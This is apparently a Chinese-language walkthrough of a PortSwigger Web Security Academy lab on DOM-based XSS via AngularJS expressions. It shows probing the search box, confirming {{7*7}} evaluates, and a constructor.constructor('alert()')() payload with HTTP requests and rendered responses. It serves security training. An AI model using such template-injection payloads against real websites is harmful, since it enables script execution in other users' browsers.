# 实验：在尖括号和双引号经过 HTML 编码的 AngularJS 表达式中的 DOM XSS

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

本实验在搜索功能的 AngularJS 表达式中包含一个基于 DOM 的跨站脚本（XSS）漏洞。

AngularJS 是一个流行的 JavaScript 库，它会扫描包含 `ng-app` 属性（也称为 AngularJS 指令）的 HTML 节点内容。当向 HTML 代码中添加指令时，你可以在双大括号 `{{}}` 内执行 JavaScript 表达式。当尖括号被编码时，此技术非常有用。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要执行一个 AngularJS 表达式并调用 `alert` 函数。

## 步骤

探测
- 使用搜索功能发送独特字符串 `zp3tnxdh`
    ```http
    GET /?search=zp3tnxdh HTTP/2
    ```

    - 响应
        ```html
        <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
        <h1>0 search results for 'zp3tnxdh'</h1>
        ```
        - 揭示 angular 库及其版本
        - 上下文为 `<h1>` 内

    - 浏览器渲染
        ```html
        <h1>0 search results for 'zp3tnxdh'</h1>
        ```

测试
- 输入 angular 表达式载荷 `{{7*7}}`，查看表达式是否执行
    ```http
    GET /?search={{7*7}} HTTP/2
    ```

    - 响应
        ```html
        <h1>0 search results for '{{7*7}}'</h1>
        ```
    
    - 浏览器渲染
        ```html
        <h1 class="ng-binding">0 search results for '49'</h1>
        ```
        - 前端 angular 库，新增 `ng-binding` 类，将双花括号内容作为代码执行

攻击
- 使用旧版 angular 库的已知漏洞，使用 `constructor` 得到构造函数
    `{{constructor.constructor('alert()')}}`
    
    ```http
    GET /?search=%7B%7Bconstructor.constructor%28%27alert%28%29%27%29%7D%7D HTTP/2
    ```

    - 响应
        ```html
        <h1>
            0 search results for '{{constructor.constructor(&apos;alert()&apos;)}}'
        </h1>
        ```
    - 浏览器渲染
        ```html
        <h1 class="ng-binding">
            0 search results for 'function anonymous( ) { alert() }'
        </h1>
        ```
        - 此处仅定义了匿名函数，并未调用
- 修改载荷，在构造 alert 函数后立即调用
    `{{constructor.constructor('alert()')()}}`

服务器返回被编码的载荷，浏览器 JS angular 库将 `{{}}` 内载荷作为代码执行
